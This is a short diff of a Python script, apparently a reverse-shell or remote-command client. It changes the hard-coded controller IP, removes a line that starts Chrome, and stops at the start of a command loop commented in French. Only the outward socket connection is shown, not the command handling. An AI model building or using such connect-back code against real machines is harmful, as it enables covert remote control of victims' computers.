@@ -2,12 +2,11 @@ import os
 import socket
 s = socket.socket()
 port=8080
-host = ('192.168.1.19')
+host = ('172.18.0.2')
 s.connect((host,port))
 print("")
 print("")
 
-os.system('start Chrome.exe')
 #Connection de la commande
 
 while 1:
